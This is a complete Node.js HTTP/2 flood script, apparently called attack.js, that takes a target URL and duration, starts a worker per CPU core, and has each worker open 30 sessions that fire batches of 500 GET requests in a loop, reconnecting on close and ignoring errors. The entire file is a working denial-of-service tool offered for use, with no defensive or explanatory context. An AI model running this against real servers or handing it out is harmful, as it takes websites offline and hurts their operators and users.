const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = cpus().length; // USE ALL CORES

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching HTTP/2 attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function flood(client) {
        const spam = () => {
            if (Date.now() > end || client.closed || client.destroyed) return;
            try {
                for (let i = 0; i < 500; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {});
                    req.end();
                }
                setImmediate(spam);
            } catch {
                // skip errors
            }
        };
        spam();
    }

    function createConnection() {
        const client = http2.connect(target);
        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 10));
        client.on('connect', () => flood(client));
    }

    for (let i = 0; i < 30; i++) createConnection(); // 30 sessions per thread
}
